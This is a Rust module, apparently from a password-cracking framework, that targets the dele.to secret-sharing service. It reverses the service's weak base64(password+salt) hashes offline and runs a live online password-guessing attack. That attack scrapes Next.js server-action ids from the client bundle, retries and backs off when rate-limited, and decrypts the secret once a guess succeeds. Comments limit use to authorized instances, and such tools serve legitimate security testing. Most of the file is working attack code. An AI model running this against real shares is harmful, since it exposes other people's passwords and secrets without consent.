//! dele.to target module.
//!
//! dele.to (<https://dele.to>, <https://github.com/dele-to/dele-to>) is a
//! self-destructing secret sharer ("an alternative to PasswordPusher, Yopass and
//! Bitwarden Send"). The secret *value* is **zero-knowledge**: encrypted
//! client-side with AES-256-GCM under a random 256-bit key carried in the URL
//! fragment (`#…`), which the browser never sends to the server. So the value is
//! not offline-recoverable from a stored blob alone — you'd need the URL key, and
//! with the URL key there is nothing to brute-force. That mode is out of scope
//! here, exactly like yopass `#/s/…` and PrivateBin's default key-only paste.
//!
//! **What *is* attackable is the optional password protection.** Unlike the
//! AES key, the password is verified **server-side**: dele.to stores a
//! `passwordHash` alongside the share and, on retrieval, recomputes it from the
//! submitted password and string-compares (`app/actions/share.ts`):
//!
//! ```js
//! function hashPassword(password) {
//!   const salt = process.env.SALT || "default-salt-change-in-production"
//!   return Buffer.from(password + salt).toString("base64")
//! }
//! // …
//! if (share.passwordHash !== hashPassword(password)) { /* reject */ }
//! ```
//!
//! That is deliberately the *weakest* password-storage scheme of any target in
//! this repo: **not** a KDF, not memory-hard, not even iterated — just
//! `base64(password ‖ salt)` with a process-wide salt that defaults to the
//! literal `"default-salt-change-in-production"`. Given the stored `passwordHash`
//! (e.g. dumped from the Redis/file store of an instance you are authorized to
//! test) and the salt, recovering the password is trivial and fully **offline** —
//! the recomputed base64 is the correctness oracle, so a wrong guess is a clean
//! miss.
//!
//! In fact the scheme is directly reversible: `base64_decode(passwordHash)` is
//! exactly `password ‖ salt`, so stripping the (known/default) salt suffix yields
//! the password with no search at all — [`recover_directly`] does this. The
//! [`Target`] impl still drives the normal candidate engine (recomputing the hash
//! per guess, mirroring the server) so dele.to slots into the framework like any
//! other target, but the direct shortcut is why this is the easiest target here.
//!
//! [`DeletoTarget`] is the **offline** path (a dumped `passwordHash`); its output
//! is the recovered **password**, and recovering the value from it additionally
//! needs the URL fragment key.
//!
//! This module also provides an **online** path, [`DeletoOnlineTarget`], for a
//! *live* share link: it drives dele.to's `getSecureShare` server action (one HTTP
//! request per candidate, like `pwpush`), and — given the URL fragment key — also
//! AES-256-GCM-decrypts the recovered value. See the section comment further down.

use std::collections::BTreeSet;
use std::sync::Mutex;
use std::thread;
use std::time::{Duration, Instant};

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use anyhow::{anyhow, bail, Result};
use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use serde_json::Value;

use crate::target::Target;

/// The salt dele.to uses when `process.env.SALT` is unset — the documented
/// default in `app/actions/share.ts`. Most self-hosted instances never change it.
pub const DEFAULT_SALT: &str = "default-salt-change-in-production";

/// An offline dele.to **password**-recovery target: a stored `passwordHash`
/// (`base64(password ‖ salt)`) that each candidate is verified against.
pub struct DeletoTarget {
    /// The stored `passwordHash` string (standard base64, with padding).
    hash: String,
    /// The salt bytes appended to the password before hashing.
    salt: Vec<u8>,
    name: String,
}

impl DeletoTarget {
    /// Build from a stored `passwordHash` and the instance salt (use
    /// [`DEFAULT_SALT`] when the instance didn't override `process.env.SALT`).
    ///
    /// Validates up front so a hash that can never match — invalid base64, or one
    /// whose decoded bytes don't end with `salt` (wrong salt) — fails immediately
    /// as a structural error rather than silently grinding the whole keyspace to
    /// misses.
    pub fn new(hash: &str, salt: &[u8]) -> Result<Self> {
        let hash = hash.trim().to_string();
        let decoded = B64
            .decode(hash.as_bytes())
            .map_err(|e| anyhow!("passwordHash is not valid base64: {e}"))?;
        // `base64(password ‖ salt)` must decode to bytes ending in the salt; if it
        // doesn't, the salt is wrong and no candidate could ever match.
        if !decoded.ends_with(salt) {
            bail!(
                "passwordHash does not end with the given salt — wrong --salt? \
                 (the stored hash decodes to `password‖salt`)"
            );
        }
        Ok(Self {
            hash,
            salt: salt.to_vec(),
            name: "deleto(base64(password+salt))".to_string(),
        })
    }

    fn attempt(&self, candidate: &[u8]) -> Option<Vec<u8>> {
        // Mirror the server exactly: hashPassword(candidate) == stored hash.
        let mut buf = Vec::with_capacity(candidate.len() + self.salt.len());
        buf.extend_from_slice(candidate);
        buf.extend_from_slice(&self.salt);
        if B64.encode(&buf) == self.hash {
            // The recovered "secret" is the password itself.
            Some(candidate.to_vec())
        } else {
            None
        }
    }
}

impl Target for DeletoTarget {
    fn try_candidate(&self, candidate: &[u8]) -> Result<Option<Vec<u8>>> {
        Ok(self.attempt(candidate))
    }

    fn name(&self) -> &str {
        &self.name
    }
}

/// Recover the password without any search: `base64_decode(passwordHash)` is
/// `password ‖ salt`, so strip the salt suffix. Returns `Ok(None)` if the hash
/// doesn't decode to bytes ending in `salt` (wrong salt). This is the cheap path;
/// the brute-force [`Target`] exists only to fit the generic engine.
pub fn recover_directly(hash: &str, salt: &[u8]) -> Result<Option<Vec<u8>>> {
    let decoded = B64
        .decode(hash.trim().as_bytes())
        .map_err(|e| anyhow!("passwordHash is not valid base64: {e}"))?;
    Ok(decoded
        .strip_suffix(salt)
        .map(|password| password.to_vec()))
}

// ----------------------------------------------------------------------------
// Online target: attack a *live* dele.to share.
//
// A live link (`/view/<id>#<key>`) carries the AES key, but the ciphertext is
// gated behind the password **server-side** — `getSecureShare(id, password)`
// refuses to return `encryptedContent`/`iv` until the password is correct. So,
// like `pwpush`, the only oracle is a running server and each candidate is one
// HTTP request. dele.to exposes no REST API; retrieval is a Next.js *server
// action* invoked by POSTing to the view route with a `Next-Action: <id>` header.
// A wrong password returns `{"success":false,"error":"Incorrect password"}` and
// (as observed) burns no view and is not rate-limited — so this is cheap, but it
// is still an **active online attack**: authorized / self-hosted instances only.
// ----------------------------------------------------------------------------

/// Where a dele.to share lives, plus the AES key from the URL fragment (if known).
#[derive(Debug, Clone)]
pub struct DeletoLocation {
    /// Everything up to (not including) the `/view/<id>` segment, e.g.
    /// `http://localhost:3000`.
    pub base_url: String,
    /// The share id (the `<id>` in `/view/<id>`).
    pub id: String,
    /// The 256-bit AES-GCM key decoded from the `#fragment`, if the URL carried
    /// one. Needed only to decrypt the recovered value — not to crack the password.
    pub key: Option<Vec<u8>>,
}

impl DeletoLocation {
    /// Parse a share URL: `scheme://host[/path]/view/<id>[#<base64 key>]`.
    pub fn from_share_url(url: &str) -> Result<Self> {
        let (before_frag, frag) = match url.split_once('#') {
            Some((b, f)) => (b, Some(f)),
            None => (url, None),
        };
        let no_query = before_frag.split('?').next().unwrap_or(before_frag);
        let idx = no_query
            .find("/view/")
            .ok_or_else(|| anyhow!("not a dele.to view URL (no '/view/<id>'): {url}"))?;
        let base = &no_query[..idx];
        let rest = &no_query[idx + "/view/".len()..];
        let id = rest.split('/').next().unwrap_or("").trim();
        if id.is_empty() {
            bail!("empty share id in {url}");
        }
        let key = match frag {
            Some(f) if !f.trim().is_empty() => Some(decode_key(f)?),
            _ => None,
        };
        Ok(Self {
            base_url: base.trim_end_matches('/').to_string(),
            id: id.to_string(),
            key,
        })
    }

    /// Build from an explicit server base URL, share id, and optional base64 key.
    pub fn from_parts(server: &str, id: &str, key: Option<&str>) -> Result<Self> {
        let id = id.trim();
        if id.is_empty() {
            bail!("empty share id");
        }
        let key = match key {
            Some(k) if !k.trim().is_empty() => Some(decode_key(k)?),
            _ => None,
        };
        Ok(Self {
            base_url: server.trim_end_matches('/').to_string(),
            id: id.to_string(),
            key,
        })
    }

    /// The view route the server action is POSTed to.
    pub fn view_endpoint(&self) -> String {
        format!("{}/view/{}", self.base_url, self.id)
    }
}

/// Decode a base64 URL-fragment key and check it is a 256-bit (32-byte) AES key.
pub fn decode_key(s: &str) -> Result<Vec<u8>> {
    let k = B64
        .decode(s.trim().as_bytes())
        .map_err(|e| anyhow!("URL fragment key is not valid base64: {e}"))?;
    if k.len() != 32 {
        bail!("URL key is {} bytes, expected 32 (AES-256)", k.len());
    }
    Ok(k)
}

/// AES-256-GCM-decrypt a dele.to value. `iv_b64` / `content_b64` are the base64
/// `iv` and `encryptedContent` the server returned; `encryptedContent` is
/// `ciphertext ‖ 16-byte GCM tag` (Web Crypto's `encrypt` output), which is
/// exactly the layout `aes-gcm`'s `decrypt` expects.
pub fn decrypt_value(key: &[u8], iv_b64: &str, content_b64: &str) -> Result<Vec<u8>> {
    let iv = B64
        .decode(iv_b64.trim().as_bytes())
        .map_err(|e| anyhow!("iv is not valid base64: {e}"))?;
    if iv.len() != 12 {
        bail!("iv is {} bytes, expected 12", iv.len());
    }
    let ct = B64
        .decode(content_b64.trim().as_bytes())
        .map_err(|e| anyhow!("encryptedContent is not valid base64: {e}"))?;
    let karr: [u8; 32] = key
        .try_into()
        .map_err(|_| anyhow!("key must be 32 bytes, got {}", key.len()))?;
    let cipher = Aes256Gcm::new((&karr).into());
    let nonce = Nonce::try_from(iv.as_slice())
        .map_err(|_| anyhow!("iv must be 12 bytes, got {}", iv.len()))?;
    cipher
        .decrypt(&nonce, ct.as_slice())
        .map_err(|_| anyhow!("AES-256-GCM decryption failed (wrong key or corrupt ciphertext)"))
}

/// Serialize the server-action arguments `getSecureShare(id, password)` as the
/// JSON array body Next.js accepts, e.g. `["<id>","<password>"]`.
fn action_body(id: &str, password: &str) -> String {
    serde_json::to_string(&[id, password]).expect("string array always serializes")
}

/// Parse a Next.js server-action (React Flight) response and return the action's
/// result object — the last line that, after its `N:` prefix, is a JSON object
/// carrying a `success` field.
fn parse_action_result(body: &str) -> Option<Value> {
    let mut result = None;
    for line in body.lines() {
        if let Some(idx) = line.find('{') {
            if let Ok(v) = serde_json::from_str::<Value>(&line[idx..]) {
                if v.get("success").is_some() {
                    result = Some(v);
                }
            }
        }
    }
    result
}

/// POST a server action. Returns `Ok((status, body))` for any HTTP response
/// (including 4xx/5xx, whose body still carries the action result), and `Err(())`
/// only for a transport-level failure the caller should retry.
fn post_action(
    agent: &ureq::Agent,
    endpoint: &str,
    origin: &str,
    action_id: &str,
    body: &str,
) -> std::result::Result<(u16, String), ()> {
    let req = agent
        .post(endpoint)
        .set("Next-Action", action_id)
        .set("Content-Type", "text/plain;charset=UTF-8")
        .set("Origin", origin)
        .set("Accept", "text/x-component");
    match req.send_string(body) {
        Ok(resp) => Ok((resp.status(), resp.into_string().unwrap_or_default())),
        Err(ureq::Error::Status(s, resp)) => Ok((s, resp.into_string().unwrap_or_default())),
        Err(ureq::Error::Transport(_)) => Err(()),
    }
}

/// Scan `text` for runs of exactly 40 lowercase-hex chars (Next.js server-action
/// ids are sha1 hex) and add them to `out`.
fn collect_hex40(text: &str, out: &mut BTreeSet<String>) {
    let bytes = text.as_bytes();
    let is_hex = |b: u8| b.is_ascii_digit() || (b'a'..=b'f').contains(&b);
    let mut i = 0;
    while i < bytes.len() {
        if is_hex(bytes[i]) {
            let start = i;
            while i < bytes.len() && is_hex(bytes[i]) {
                i += 1;
            }
            if i - start == 40 {
                out.insert(text[start..i].to_string());
            }
        } else {
            i += 1;
        }
    }
}

/// Extract `/_next/static/chunks/*.js` URLs referenced by a page's HTML.
fn extract_chunk_urls(html: &str, base: &str) -> Vec<String> {
    const NEEDLE: &str = "/_next/static/chunks/";
    let mut seen = BTreeSet::new();
    let mut out = Vec::new();
    let mut rest = html;
    while let Some(pos) = rest.find(NEEDLE) {
        rest = &rest[pos..];
        let end = rest
            .find(|c: char| c == '"' || c == '\'' || c == '\\' || c.is_whitespace())
            .unwrap_or(rest.len());
        let path = &rest[..end];
        if path.ends_with(".js") {
            let url = format!("{base}{path}");
            if seen.insert(url.clone()) {
                out.push(url);
            }
        }
        rest = &rest[end..];
    }
    out
}

/// Discover the `getSecureShare` server-action id for a (password-protected)
/// share by reading the client bundle and probing each candidate id with a
/// deliberately wrong password — the right action answers `"Incorrect password"`
/// (or `"Password required"`), which **burns no view**.
///
/// Returns the action id. Fails if the bundle layout is unrecognizable or the
/// share has no password gate (in which case pass `--action-id`, or there is
/// nothing to crack).
pub fn discover_get_secure_share_action(base_url: &str, id: &str) -> Result<String> {
    let agent = build_agent();
    let view = format!("{}/view/{}", base_url.trim_end_matches('/'), id);
    let html = agent
        .get(&view)
        .call()
        .map_err(|e| anyhow!("fetching {view}: {e}"))?
        .into_string()
        .map_err(|e| anyhow!("reading {view}: {e}"))?;

    let mut ids = BTreeSet::new();
    for chunk in extract_chunk_urls(&html, base_url.trim_end_matches('/')) {
        if let Ok(resp) = agent.get(&chunk).call() {
            if let Ok(text) = resp.into_string() {
                collect_hex40(&text, &mut ids);
            }
        }
    }
    if ids.is_empty() {
        bail!("found no server-action ids in the dele.to client bundle (layout changed?); pass --action-id");
    }

    let probe = action_body(id, "\u{0}__karkinos_probe__");
    for action in &ids {
        if let Ok((_status, text)) = post_action(&agent, &view, base_url.trim_end_matches('/'), action, &probe) {
            if let Some(v) = parse_action_result(&text) {
                let err = v.get("error").and_then(Value::as_str).unwrap_or("");
                if err.eq_ignore_ascii_case("Incorrect password")
                    || err.eq_ignore_ascii_case("Password required")
                {
                    return Ok(action.clone());
                }
            }
        }
    }
    bail!(
        "could not identify the getSecureShare action among {} candidate id(s) — \
         the share may not be password-protected, or the API changed. Pass --action-id.",
        ids.len()
    )
}

fn build_agent() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout(Duration::from_secs(30))
        .build()
}

/// A shared minimum-interval pacer (throttles the *total* request rate across all
/// workers, since the runner shares one `Arc<dyn Target>`).
struct Pace {
    interval: Duration,
    next: Mutex<Instant>,
}

impl Pace {
    fn new(interval: Duration) -> Self {
        Self { interval, next: Mutex::new(Instant::now()) }
    }
    fn wait(&self) {
        if self.interval.is_zero() {
            return;
        }
        let mut next = self.next.lock().unwrap();
        let now = Instant::now();
        if *next > now {
            thread::sleep(*next - now);
        }
        *next = (*next).max(Instant::now()) + self.interval;
    }
}

/// An **online** dele.to password-guessing target.
pub struct DeletoOnlineTarget {
    endpoint: String,
    origin: String,
    id: String,
    action_id: String,
    /// AES key from the URL fragment; if present, a hit is decrypted to plaintext.
    key: Option<Vec<u8>>,
    agent: ureq::Agent,
    pace: Pace,
    max_retries: u32,
    retry_base: Duration,
    retry_max: Duration,
    name: String,
}

impl DeletoOnlineTarget {
    /// Build a target for a share location and the resolved `getSecureShare`
    /// action id. `delay` is the minimum interval between requests.
    pub fn new(loc: &DeletoLocation, action_id: String, delay: Duration) -> Self {
        Self {
            endpoint: loc.view_endpoint(),
            origin: loc.base_url.clone(),
            id: loc.id.clone(),
            action_id,
            key: loc.key.clone(),
            agent: build_agent(),
            pace: Pace::new(delay),
            max_retries: 5,
            retry_base: Duration::from_millis(500),
            retry_max: Duration::from_secs(30),
            name: "deleto(online)".to_string(),
        }
    }

    /// Whether a recovered value can be decrypted (the URL key is known).
    pub fn can_decrypt(&self) -> bool {
        self.key.is_some()
    }
}

impl Target for DeletoOnlineTarget {
    fn try_candidate(&self, candidate: &[u8]) -> Result<Option<Vec<u8>>> {
        // The password is compared as a string server-side; a non-UTF-8 candidate
        // cannot be it — a clean miss, never fatal.
        let pw = match std::str::from_utf8(candidate) {
            Ok(s) => s,
            Err(_) => return Ok(None),
        };
        let body = action_body(&self.id, pw);

        let mut backoff = self.retry_base;
        for _ in 0..=self.max_retries {
            self.pace.wait();

            let (status, text) =
                match post_action(&self.agent, &self.endpoint, &self.origin, &self.action_id, &body) {
                    Ok(v) => v,
                    Err(()) => {
                        thread::sleep(backoff);
                        backoff = (backoff * 2).min(self.retry_max);
                        continue;
                    }
                };
            if status == 429 {
                thread::sleep(backoff);
                backoff = (backoff * 2).min(self.retry_max);
                continue;
            }

            let Some(v) = parse_action_result(&text) else {
                bail!(
                    "unrecognized dele.to server-action response (HTTP {status}); \
                     wrong --action-id, or the share id/URL is invalid"
                );
            };

            if v.get("success").and_then(Value::as_bool) == Some(true) {
                // Hit. Decrypt with the URL key if we have it; otherwise the
                // recovered password is itself the result we report.
                let data = v.get("data").unwrap_or(&v);
                let enc = data.get("encryptedContent").and_then(Value::as_str);
                let iv = data.get("iv").and_then(Value::as_str);
                return match (&self.key, enc, iv) {
                    (Some(key), Some(enc), Some(iv)) => Ok(Some(decrypt_value(key, iv, enc)?)),
                    // Password is correct but we can't (or needn't) decrypt: report it.
                    _ => Ok(Some(candidate.to_vec())),
                };
            }

            let err = v.get("error").and_then(Value::as_str).unwrap_or("");
            if err.eq_ignore_ascii_case("Incorrect password")
                || err.eq_ignore_ascii_case("Password required")
            {
                return Ok(None);
            }
            bail!("dele.to returned a non-password error (HTTP {status}): {err:?}");
        }
        bail!(
            "giving up after {} retries (rate-limit/transport) — raise --delay-ms or lower --threads",
            self.max_retries
        )
    }

    fn name(&self) -> &str {
        &self.name
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Reproduce the server's `hashPassword` for building fixtures.
    fn hash_password(password: &[u8], salt: &[u8]) -> String {
        let mut buf = password.to_vec();
        buf.extend_from_slice(salt);
        B64.encode(&buf)
    }

    #[test]
    fn matches_server_hash_with_default_salt() {
        let hash = hash_password(b"hunter2", DEFAULT_SALT.as_bytes());
        let target = DeletoTarget::new(&hash, DEFAULT_SALT.as_bytes()).unwrap();
        assert_eq!(
            target.try_candidate(b"hunter2").unwrap(),
            Some(b"hunter2".to_vec())
        );
        assert!(target.try_candidate(b"hunter3").unwrap().is_none());
        // Non-UTF-8 candidate is a clean miss, never an error.
        assert!(target.try_candidate(&[0xff, 0xfe]).unwrap().is_none());
    }

    #[test]
    fn matches_with_custom_salt() {
        let salt = b"my-instance-salt";
        let hash = hash_password(b"correct horse", salt);
        let target = DeletoTarget::new(&hash, salt).unwrap();
        assert_eq!(
            target.try_candidate(b"correct horse").unwrap(),
            Some(b"correct horse".to_vec())
        );
        // Same password but the default salt must NOT verify against a custom-salt hash.
        assert!(DeletoTarget::new(&hash, DEFAULT_SALT.as_bytes()).is_err());
    }

    #[test]
    fn rejects_malformed_or_wrong_salt_at_construction() {
        // Not base64.
        assert!(DeletoTarget::new("not base64 !!!", DEFAULT_SALT.as_bytes()).is_err());
        // Valid base64, but decodes to bytes not ending in the salt.
        let wrong = B64.encode(b"password+OTHER_SALT");
        assert!(DeletoTarget::new(&wrong, DEFAULT_SALT.as_bytes()).is_err());
    }

    #[test]
    fn direct_recovery_skips_the_search() {
        let hash = hash_password(b"s3cr3t!", DEFAULT_SALT.as_bytes());
        assert_eq!(
            recover_directly(&hash, DEFAULT_SALT.as_bytes()).unwrap(),
            Some(b"s3cr3t!".to_vec())
        );
        // Empty password is a legitimate (if silly) case: hash is base64(salt).
        let empty = hash_password(b"", DEFAULT_SALT.as_bytes());
        assert_eq!(
            recover_directly(&empty, DEFAULT_SALT.as_bytes()).unwrap(),
            Some(Vec::new())
        );
        // Wrong salt → cannot strip → None (not an error).
        assert_eq!(
            recover_directly(&hash, b"different-salt").unwrap(),
            None
        );
    }

    // ---- online target: pure helpers --------------------------------------

    #[test]
    fn parse_view_url_with_key() {
        let key = B64.encode([7u8; 32]);
        let url = format!("https://dele.to/view/abc-123#{key}");
        let loc = DeletoLocation::from_share_url(&url).unwrap();
        assert_eq!(loc.base_url, "https://dele.to");
        assert_eq!(loc.id, "abc-123");
        assert_eq!(loc.view_endpoint(), "https://dele.to/view/abc-123");
        assert_eq!(loc.key.unwrap(), vec![7u8; 32]);
    }

    #[test]
    fn parse_view_url_without_key_and_strips_query() {
        let loc = DeletoLocation::from_share_url("http://localhost:3000/view/xyz?foo=1").unwrap();
        assert_eq!(loc.base_url, "http://localhost:3000");
        assert_eq!(loc.id, "xyz");
        assert!(loc.key.is_none());
    }

    #[test]
    fn reject_non_view_url_and_bad_key() {
        assert!(DeletoLocation::from_share_url("https://dele.to/create").is_err());
        // Fragment present but not a 32-byte key.
        assert!(DeletoLocation::from_share_url("https://dele.to/view/x#short").is_err());
        assert!(decode_key(&B64.encode([0u8; 16])).is_err()); // 16 bytes, not 32
        assert_eq!(decode_key(&B64.encode([1u8; 32])).unwrap(), vec![1u8; 32]);
    }

    #[test]
    fn decrypt_value_roundtrips_webcrypto_layout() {
        use aes_gcm::aead::Aead;
        // Encrypt as Web Crypto does: ciphertext ‖ 16-byte tag, base64.
        let key = [9u8; 32];
        let iv = [3u8; 12];
        let cipher = Aes256Gcm::new((&key).into());
        let ct = cipher
            .encrypt(&Nonce::try_from(iv.as_slice()).unwrap(), b"top secret".as_slice())
            .unwrap();
        let pt = decrypt_value(&key, &B64.encode(iv), &B64.encode(&ct)).unwrap();
        assert_eq!(pt, b"top secret");
        // Wrong key fails the GCM tag (returns Err, not garbage).
        assert!(decrypt_value(&[0u8; 32], &B64.encode(iv), &B64.encode(&ct)).is_err());
    }

    #[test]
    fn action_body_is_json_array() {
        assert_eq!(action_body("id1", "pw\"x"), r#"["id1","pw\"x"]"#);
    }

    #[test]
    fn parse_action_result_picks_the_success_object() {
        let body = "0:[\"$@1\",[\"ref\",null]]\n1:{\"success\":true,\"data\":{\"iv\":\"AAAA\"}}\n";
        let v = parse_action_result(body).unwrap();
        assert_eq!(v.get("success").and_then(Value::as_bool), Some(true));
        let miss = parse_action_result("1:{\"success\":false,\"error\":\"Incorrect password\"}");
        assert_eq!(
            miss.unwrap().get("error").and_then(Value::as_str),
            Some("Incorrect password")
        );
        assert!(parse_action_result("0:[\"no success field here\"]").is_none());
    }

    #[test]
    fn collect_hex40_finds_exact_runs() {
        let mut out = BTreeSet::new();
        let id = "a".repeat(40);
        let too_long = "b".repeat(41);
        collect_hex40(&format!("x(\"{id}\")y \"{too_long}\" 1234"), &mut out);
        assert!(out.contains(&id));
        assert_eq!(out.len(), 1); // the 41-run and the short "1234" are excluded
    }

    #[test]
    fn extract_chunk_urls_dedups_and_filters() {
        let html = r#"<script src="/_next/static/chunks/a.js"></script>
            <link href="/_next/static/chunks/a.js"/>
            <script src="/_next/static/chunks/b-1.js">"#;
        let urls = extract_chunk_urls(html, "http://localhost:3000");
        assert_eq!(
            urls,
            vec![
                "http://localhost:3000/_next/static/chunks/a.js".to_string(),
                "http://localhost:3000/_next/static/chunks/b-1.js".to_string(),
            ]
        );
    }
}
